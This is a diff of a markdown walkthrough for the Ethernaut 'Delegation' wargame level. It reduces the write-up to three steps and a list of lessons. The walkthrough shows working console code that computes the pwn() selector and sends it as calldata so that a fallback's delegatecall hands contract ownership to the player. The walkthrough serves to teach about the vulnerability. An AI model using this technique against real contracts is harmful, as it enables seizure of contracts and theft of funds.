@@ -1,105 +1,79 @@
-# Delegation – Level 6 Walkthrough
+# Delegation
 
-Welcome to the **Delegation** level of the [Ethernaut](https://ethernaut.openzeppelin.com/) wargame by OpenZeppelin, focused on exploiting `delegatecall` misuse and understanding storage collision vulnerabilities in smart contracts.
+## Objective
 
----
-
-## Challenge Objective
-
-You are given a contract with a fallback function that uses `delegatecall` to another contract. Your goal is to:
-
-- Become the owner of the main contract
-- Submit the instance to complete the level
-
----
-
-## Prerequisites
-
-Before you begin, ensure the following:
-
-- **MetaMask** is installed and connected
-- **Test ETH** is available (Goerli, Sepolia, etc.)
-- Familiarity with using **browser DevTools** and executing JavaScript commands
-- Access to the [Ethernaut Game](https://ethernaut.openzeppelin.com/)
+Exploit the misuse of `delegatecall` in the Delegation contract to become the owner and complete the level.
 
 ---
 
 ## Getting Started
 
-### 1. **Load the Level**
+1. Go to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
+2. Select the **"Delegation"** level
+3. Click **“Get new instance”** and approve the transaction in MetaMask
+4. The instance is now deployed and available as the `contract` object in the browser console
+5. Save the instance address:
 
-- Navigate to [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
-- Select **"Delegation"** from the list of levels
-- Click **"Get new instance"**
-- Approve the MetaMask transaction to deploy your personalized challenge contract
-
-Once the contract is deployed, it will inject a global object called `contract` into your browser console.
+    ```js
+    contract.address
+    ```
 
 ---
 
-## Walkthrough – Step by Step
+## Walkthrough
 
-### 🗒️ Step 1: Get the Function Selector for `pwn()`
+### Step 1: Obtain the Function Selector for `pwn()`
 
 ```js
 web3.utils.keccak256("pwn()").slice(0,10)
 ```
-> This returns the function selector for `pwn()`, which is `"0xdd365b8b"`.
+
+**Explanation:**
+This computes the function selector for the `pwn()` function, which is required to trigger the fallback function via a low-level call.
 
 ---
 
-### 🛠️ Step 2: Call the Fallback Function with the Selector
+### Step 2: Call the Fallback Function with the Selector
 
 ```js
 await web3.eth.sendTransaction({
-    from: player,
-    to: contract.address,
-    data: "0xdd365b8b"
+     from: player,
+     to: contract.address,
+     data: "0xdd365b8b"
 });
 ```
-> This triggers the fallback in `Delegation`, which uses `delegatecall` to execute `pwn()` in the context of `Delegation`, making you the owner.
+
+**Explanation:**
+This sends a transaction to the contract with the `pwn()` selector as calldata. The fallback function uses `delegatecall` to execute `pwn()` in the context of the Delegation contract, making you the owner.
 
 ---
 
-### 🔍 Step 3: Verify Ownership
+### Step 3: Verify Ownership
 
 ```js
 await contract.owner()
 ```
-> This should return your wallet address, confirming you are now the owner.
+
+**Explanation:**
+Checks if your address is now the owner, confirming the exploit was successful.
 
 ---
 
-### ✅ Step 4: Submit the Level
+## What You Learn
 
-Click **“Submit instance”** in the UI and confirm the MetaMask transaction. Once successful, the level is marked as **completed**.
+This level teaches the following:
 
----
-
-## 💡 What You Learn
-
-- How `delegatecall` works in Solidity
-- The risks of forwarding calldata with `delegatecall`
-- How storage layout affects contract security
-- Why fallback functions can be dangerous with `delegatecall`
+* How `delegatecall` executes code in the context of the calling contract
+* The risks of forwarding calldata with `delegatecall` and fallback functions
+* How storage layout affects contract security and can lead to vulnerabilities
+* Defensive patterns to avoid storage collisions and unsafe delegatecalls
 
 ---
 
-## Concepts Covered
+## Resources Used
 
-| Concept           | Description                                                                     |
-| ----------------- | ------------------------------------------------------------------------------- |
-| `delegatecall`    | Executes code from another contract in the context of the calling contract      |
-| Fallback function | Handles calls to undefined functions; risky with delegatecall                   |
-| Function selector | First 4 bytes of the Keccak-256 hash of the function signature                  |
-| Storage collision | Delegatecall modifies the storage of the calling contract, not the callee       |
-
----
-
-## Resources
-
-- [Ethernaut Game](https://ethernaut.openzeppelin.com/)
-- [Solidity Docs – delegatecall](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)
-- [Blog: How to Hack Solidity Contracts with delegatecall](https://shubhamm.me/blog/ethernaut_challenges_delegation)
+* [Ethernaut Game](https://ethernaut.openzeppelin.com/)
+* [Solidity Docs – delegatecall](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)
+* [Blog: How to Hack Solidity Contracts with delegatecall](https://shubhamm.me/blog/ethernaut_challenges_delegation)
 
 ---
